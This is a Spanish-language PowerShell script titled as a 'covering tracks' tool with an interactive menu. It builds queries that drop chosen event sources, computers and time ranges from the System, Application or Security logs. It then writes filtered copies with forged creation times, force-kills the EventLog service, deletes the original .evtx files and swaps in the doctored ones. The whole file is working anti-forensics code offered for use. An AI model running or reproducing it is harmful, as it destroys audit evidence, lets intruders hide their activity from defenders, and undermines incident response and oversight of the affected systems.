
#Covering Tracks Herramienta con MEN�

#Funcion ExportEventlog
function Export-EventLog {
    <#
    .SYNOPSIS
        Export an event log to a saved event log file.
    .DESCRIPTION
        Export an event log, and it's messages, to a named event log file.
    .EXAMPLE
        Get-WinEvent -ListLog Application | Export-EventLog
    #>

    [CmdletBinding()]
    param (
        [Parameter(ValueFromPipeline, ValueFromPipelineByPropertyName)]
        [string]
        $LogName,

        # If not set, a file named after the event log is created.
        [Parameter(ValueFromPipelineByPropertyName)]
        [string]
        $Path,

        [string]
        $Query = '*',

        [PSCredential]
        $Credential,

        [string]
        $ComputerName = $env:COMPUTERNAME,

        [System.Globalization.CultureInfo]
        $Culture = (Get-Culture)
    )

    begin {
        if ($Credential) {
            $username, $domain = $Credential.Username
            if (-not $username) {
                $username = $domain
                $domain = $ComputerName
            }

            $eventLogSession = [System.Diagnostics.Eventing.Reader.EventLogSession]::new(
                $ComputerName,
                $username,
                $domain,
                $Credential.Password,
                'Default'
            )
        }
        elseif ($ComputerName -eq $env:COMPUTERNAME) {
            $eventLogSession = [System.Diagnostics.Eventing.Reader.EventLogSession]::new()
        }
        else {
            $eventLogSession = [System.Diagnostics.Eventing.Reader.EventLogSession]::new($ComputerName)
        }
    }

    process {
        if (-not $Path) {
            $name = '{0}.evtx' -f $LogName -replace '/', '_'
            $Path = Join-Path -Path $pwd -ChildPath $name
        }

        try {
            Write-Verbose ('Exporting event log {0} to {1}' -f $LogName, $Path)
            if (Test-Path $Path -PathType Leaf) {
                Remove-Item $Path -ErrorAction Stop
            }

            $eventLogSession.ExportLogAndMessages(
                $LogName,
                'LogName',
                $Query,
                $Path,
                $true,
                $Culture
            )
        }
        catch {
            Write-Error -ErrorRecord $_
        }
    }

    end {
        $eventLogSession.Dispose()
    }
}

function Reinicio {
    $EventLogPID = (Get-CimInstance Win32_Service -Filter "Name='EventLog'").ProcessID
    taskkill /F /PID $EventLogPID 
    taskkill /IM "explorer.exe" /F  
    foreach ($value2 in $EL) {
    $Path1 = "C:\Windows\System32\winevt\Logs\{0}.evtx" -f $value2
    $Path2 = "C:\Windows\System32\winevt\Logs\{0}1.evtx" -f $value2
    $newName = "{0}.evtx" -f $value2
    Remove-Item -Path $Path1
    Rename-Item -Path $Path2 -NewName $newName
    }
    Start-Service EventLog
    Start-Process explorer.exe   
}

            $EL=@()
            $flag = "y"
                while ($flag -eq "y") {
                    Write-Host 'EventLog a alterar (System, Application o Security)'
                    $EL += Read-Host
                    Write-Host 'Quieres alterar más EventLogs? (y/n)'
                    $flag = Read-Host
                }
                $EL
            foreach ($value2 in $EL) {
            Write-Host "Introduzca el nombre del EventLog a alterar (System / Application / Security)" 
            $value = Read-Host 
            $Level = @()
                $flag = "y"
                while ($flag -eq "y") {
                    Write-Host 'Origen (entre '' '')'
                    $Level += Read-Host
                    Write-Host 'Quieres anadir mas origenes? (y/n)'
                    $flag = Read-Host
                }
            

            Write-Host "Introduzca la fecha de inicio (FORMATO: yyyy-mm-ddThh:mm:ss.mmmZ ) 2020-04-23T11:29:06.999Z" 
            $n1 = Read-Host 
            Write-Host "Quieres introducir un ordenador implicado? (yes/no)" 
            $fordenador = Read-Host
            if($fordenador -eq "yes"){
                Write-Host "Introduzca el nombre del ordenador implicado entre comillas" 
                $ordenador = Read-Host 
            }
            Write-Host "Pulse intro para proceder a la creacion del nuevo EventLog"
            Read-Host 


            $Query = [Xml]@'
<QueryList>
  <Query Id="0" Path="Application">
    <Select Path="Application"></Select>
  </Query>
</QueryList>
'@
            #Construcci�n de la parte de la query referente al Origen de log
            $Query.QueryList.Query.Path = 'System'
            $Query.QueryList.Query.Select.Path = 'System'
            $levelXPath = foreach ($value in $Level) {
                '@Name!={0}' -f $value
            }
            $Query.QueryList.Query.Select.InnerText = '*[System[Provider[({0})]' -f ($levelXPath -join ' and ')
            $Q3 = '*[System[Provider[({0})]' -f ($levelXPath -join ' and ')
            $path = "Application"
            #Q1 realizar� la selecci�n de TODOS los logs hasta la fecha dada.
            $Q1 = '
<QueryList>
  <Query Id="0" Path="{0}">
    <Select Path="{0}">*[System[TimeCreated[@SystemTime&lt;="{1}"]]]</Select>
  </Query>
' -f $value2, $n1

            #Q2 realizar� el borrado del rastro que aplicaciones que queramos hayan dejado en el LOG
            $Q2 = ' <Query Id="1" Path="{0}">
<Select Path="{0}">' -f $value2
            $Q3
            $Q4 = ' and (Computer="{0}") ' -f $ordenador 
            $Q5 = ' and TimeCreated[@SystemTime&gt;="{0}"]]]</Select>
</Query>
</QueryList>
' -f $n1
            #Construcci�n final de la Query a exportar
            if($fordenador -eq "yes"){
                $QueryFinal = $Q1 + $Q2 + $Q3 + $Q4 + $Q5

            }else{
                $QueryFinal = $Q1 + $Q2 + $Q3 + $Q5

            }
            Write-Host "La Query final sera:"
            Write-Host "-------------------------"
            $QueryFinal

            if ($value2 -eq 'Application') {
                Export-EventLog -LogName Application1 -Query $QueryFinal
                $creationTime = (Get-ChildItem C:\Windows\System32\winevt\Logs\Application.evtx).CreationTime
                (Get-ChildItem '.\Application1.evtx').CreationTime = $creationTime
                Copy-Item .\Application1.evtx C:\Windows\System32\winevt\Logs
                Write-Host "Volcado completado y copiado al directorio de Logs"
            }
            if ($value2 -eq 'System') {
                Export-EventLog -LogName System1 -Query $QueryFinal
                $creationTime = (Get-ChildItem C:\Windows\System32\winevt\Logs\System.evtx).CreationTime
                (Get-ChildItem '.\System1.evtx').CreationTime = $creationTime
                Copy-Item .\System1.evtx C:\Windows\System32\winevt\Logs
                Write-Host "Volcado completado y copiado al directorio de Logs"
            }            
            if ($value2 -eq 'Security') {
                Export-EventLog -LogName Security1 -Query $QueryFinal
                $creationTime = (Get-ChildItem C:\Windows\System32\winevt\Logs\Security.evtx).CreationTime
                (Get-ChildItem '.\Security1.evtx').CreationTime = $creationTime
                Copy-Item .\Security1.evtx C:\Windows\System32\winevt\Logs
                Write-Host "Volcado completado y copiado al directorio de Logs"
            }


            

            }

            Reinicio

